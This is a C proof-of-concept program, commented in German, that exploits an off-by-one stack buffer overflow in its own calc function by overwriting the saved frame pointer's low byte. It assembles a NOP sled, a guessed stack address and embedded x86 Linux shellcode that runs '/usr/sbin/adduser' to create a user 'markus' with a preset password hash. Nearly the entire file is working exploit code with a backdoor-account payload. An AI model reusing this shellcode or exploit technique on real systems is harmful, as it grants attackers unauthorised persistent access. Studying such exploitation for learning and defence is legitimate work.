#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/errno.h>

#define DEFAULT_OFFSET	500 - 32
#define DEFAULT_BUFFER	521
#define NOP		0x90

char shellcode[] =
	"\xeb\x3a\x5e\x89\x76\x3f\x8d\x46"
	"\x12\x89\x46\x43\x8d\x46\x19\x89"
	"\x46\x47\x8d\x46\x1c\x89\x46\x4b"
	"\x31\xc0\x88\x46\x11\x88\x46\x18"
	"\x88\x46\x1b\x88\x46\x3e\x89\x46"
	"\x4f\xb0\x0b\x89\xf3\x8d\x4e\x3f"
	"\x8d\x56\x4f\xcd\x80\x31\xdb\x89"
	"\xd8\x40\xcd\x80\xe8\xc1\xff\xff"
	"\xff\x2f\x75\x73\x72\x2f\x73\x62"
	"\x69\x6e\x2f\x61\x64\x64\x75\x73"
	"\x65\x72\x23\x6d\x61\x72\x6b\x75"
	"\x73\x23\x2d\x70\x23\x24\x31\x24"
	"\x37\xcf\x76\xd9\x4c\x4b\xcf\xb5"
	"\x24\x67\x53\x55\x4b\x47\x36\x52"
	"\x41\x4c\x7a\x52\x41\x38\x72\x79"
	"\x52\x4f\x63\x54\x73\x47\x30\x23";


unsigned long getESP(void) {
	__asm__("movl %esp,%eax");
}

void calc(char *str) {
	char bb[512];
	int i;
	//Da zu viel Speicher reserviert wird
	//(Bug von GCC). Schleife etwas weiter laufen
	//lassen. Es wird trotzdem nur das Lower-Byte
	//vom SFP �berschrieben!!!
	for(i=0;i<=520;i++)
		bb[i] = str[i];
	bb[0] = bb[0];
}

void calctmp(char *str) {
	//Auruf erfolgt nicht �ber main,
	//sondern �ber Zwischenfunktion, Warum???
	//SFP wird bei main zu gro� und kann daher nicht
	//erreicht werden.
	//Pr�fen ob dies auch an argc und argv und envp liegt
	//char arr[33];
	calc(str);
}

int main(int argc, char *argv[]) {
	//char dummy[1];
	char *buff, *tmp;
	int offset = DEFAULT_OFFSET, buffs = DEFAULT_BUFFER, i;
	long adr, *adr_pointer;
	if(argc>1)
		offset = atoi(argv[1]);

	buff = malloc(buffs);	//Speicherplatz aufm Heap reserviren

	adr = getESP() - offset;
	tmp = buff;
	adr_pointer = (long*) (tmp+1);  //+1, da Stack falsch aufgebaut
	for(i=0;i<buffs;i+=4)	//Komplett mit der vermuteten Adresse f�llen
		*(adr_pointer++) = adr;

	for(i=0;i<= buffs/2;i++) //erste H�lfte mit Nops f�llen
		buff[i] = NOP;

	tmp = buff + ((buffs/2) - (strlen(shellcode)/2));
	for(i=0;i<strlen(shellcode);i++)
		*(tmp++) = shellcode[i];


	buff[buffs - 1] = 1; //Off-by_one-Byte

	calctmp(buff);

	/*printf("%s", buff);
	fflush(stdout);*/

	return 0;

}
